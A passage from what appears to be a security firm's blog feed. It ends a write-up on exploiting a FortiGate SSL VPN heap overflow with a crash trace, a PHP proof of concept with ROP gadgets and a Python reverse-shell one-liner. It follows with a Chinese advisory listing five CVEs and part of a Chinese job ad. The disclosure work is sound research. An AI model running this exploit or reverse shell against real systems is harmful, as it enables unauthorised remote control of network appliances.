    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Get the shell
  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.&lt;/p&gt;

    &lt;p&gt;Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something &lt;strong&gt;regularly&lt;/strong&gt; appears! It would be great if it is &lt;strong&gt;everywhere&lt;/strong&gt;, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time … and we started to fuzz the server, trying to get something useful.&lt;/p&gt;

    &lt;p&gt;We got an interesting crash. To our great surprise, we almost control the program counter!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here is the crash, and that’s why we love fuzzing! ;)&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Program received signal SIGSEGV, Segmentation fault.
  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
  2: /x $rax = 0x41414141
  1: x/i $pc
  =&amp;gt; 0x7fb908d12a77 &amp;lt;SSL_do_handshake+23&amp;gt;: callq *0x60(%rax)
  (gdb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;The crash happened in &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_do_handshake()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SSL_do_handshake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl_renegotiate_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL_in_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_in_before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_MODE_ASYNC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ASYNC_get_current_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_async_args&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_start_async_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_do_handshake_intern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handshake_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;We overwrote the function table inside &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt;&lt;/a&gt; called &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087&quot;&gt;method&lt;/a&gt;, so when the program trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s-&amp;gt;method-&amp;gt;ssl_renegotiate_check(s, 0);&lt;/code&gt;, it crashed.&lt;/p&gt;

    &lt;p&gt;This is actually an ideal target of our exploit! The allocation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt; can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret = s-&amp;gt;handshake_func(s);&lt;/code&gt; calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.&lt;/p&gt;

    &lt;p&gt;We first &lt;strong&gt;spray&lt;/strong&gt; the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here we put our php PoC on an HTTP server:&lt;/p&gt;
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;II&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32FC078&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110FA1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110fa15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1bed1f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop rax ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x04410f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// add rdi, rax ; mov eax, dword [rdi] ; ret  ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1366639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call system ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;python -c &apos;import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);&apos; xx.xxx.xx.xx /bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;AAAAAAAA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// offset&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:void(0);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;The PoC can be divided into three parts.&lt;/p&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Fake SSL structure
 The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt; to a place containing a void function pointer. The parameter at this time is SSL structure itself &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;. However, there is only 8 bytes ahead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;. We cannot simply call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt; on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:&lt;/p&gt;

        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;So we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handshake_func&lt;/code&gt; to this gadget, move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to our SSL structure, and do further ROP attack.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;ROP chain
 The ROP chain here is simple. We slightly move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; forward so there is enough space for our reverse shell command.&lt;/li&gt;
      &lt;li&gt;Overflow string
 Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_do_handshake&lt;/code&gt;. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;demo&quot;&gt;Demo&lt;/h1&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Aw55HqZW4x0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;11 December, 2018 Reported to Fortinet&lt;/li&gt;
  &lt;li&gt;19 March, 2019 All fix scheduled&lt;/li&gt;
  &lt;li&gt;24 May, 2019 All advisory released&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
&lt;p&gt;Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</link>
                <guid>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Fortigate SSL VPN 資安通報</title>
                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;

&lt;p&gt;上一篇 SSL VPN 研究系列文我們通報了在 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect 上的 RCE 弱點&lt;/a&gt;，這一篇將公開我們在 Fortigate SSL VPN 上的研究，共計找到下列五個弱點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2018-13379: Pre-auth arbitrary file reading&lt;/li&gt;
  &lt;li&gt;CVE-2018-13380: Pre-auth XSS&lt;/li&gt;
  &lt;li&gt;CVE-2018-13381: Pre-auth heap overflow&lt;/li&gt;
  &lt;li&gt;CVE-2018-13382: The magic backdoor&lt;/li&gt;
  &lt;li&gt;CVE-2018-13383: Post-auth heap overflow&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;透過不需認證的任意讀檔問題(CVE-2018-13379)加上管理介面上的 heap overflow(CVE-2018-13383)，惡意使用者可直接取得 SSL VPN 的最高權限。&lt;/p&gt;

&lt;p&gt;此外，我們也發現了一個官方後門(CVE-2018-13382)，可以任意修改使用者密碼。&lt;/p&gt;

&lt;p&gt;在回報 Fortigate 後，官方已陸續修復這些弱點，建議 Fortigate SSL VPN 的用戶更新至最新版。&lt;/p&gt;

&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：
&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;這系列 VPN 研究也得到了今年 BlackHat 2019 Pwnie Awards 的 &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;pwnie for best server-side bug&lt;/a&gt;（年度最佳伺服器漏洞）。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[已結束] DEVCORE 徵求行政專員</title>
                <description>&lt;p&gt;戴夫寇爾即將滿七年了，過去我們不斷地鑽研進階攻擊技巧，為許多客戶提供高品質的滲透測試服務，也成為客戶最信賴的資安伙伴之一。在 2017 年我們更成為第一個在台灣推出紅隊演練服務的本土廠商，透過無所不用其極的駭客思維，陸續為電子商務、政府部門、金融業者執行最真實且全面的攻擊演練，同時也累積了豐富的經驗與案例，成為台灣紅隊演練實力最深厚的服務供應商。&lt;/p&gt;

&lt;p&gt;在 2015 年我們曾經公開徵求一位行政出納人才，後來經過層層的履歷審核、筆試、面試，終於順利找到一位經驗豐富且值得信賴的生活駭客，成為我們最強而有力的後勤伙伴。但是隨著團隊人數增長、業務規模大幅增加、事務分工專業化，行政部門的眾多工作已經無法由單一人力獨自負荷。&lt;/p&gt;

&lt;p&gt;因此今年我們再度公開招募行政人才，希望能夠找到一位行政專員，擴大我們的後勤能量，鞏固戴夫寇爾的團隊作戰能力，讓我們持續為企業提供最優異的資安服務。&lt;/p&gt;

&lt;p&gt;我們非常渴望您的加入，若您有意成為戴夫寇爾的一員，可參考下列職缺細節：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;工作內容&quot;&gt;工作內容&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;庶務性行政工作 50%
    &lt;ul&gt;
      &lt;li&gt;人員接待，例如：電話接聽、來訪人員接待&lt;/li&gt;
      &lt;li&gt;文件收發，例如：郵務作業、快遞服務&lt;/li&gt;
      &lt;li&gt;檔案管理，例如：名片掃描、合約掃描、範本檔案格式調整&lt;/li&gt;
      &lt;li&gt;資料蒐集，例如：各類公司業務需求資料查找&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;總務工作 20%
    &lt;ul&gt;
      &lt;li&gt;辦公室各類用品採買&lt;/li&gt;
      &lt;li&gt;辦公室環境維護&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;採購工作 15%
    &lt;ul&gt;
      &lt;li&gt;設備採購管理&lt;/li&gt;
      &lt;li&gt;服務供應商管理&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;人事工作 5%
    &lt;ul&gt;
      &lt;li&gt;保險事務，例如：團體保險、旅遊不便險&lt;/li&gt;
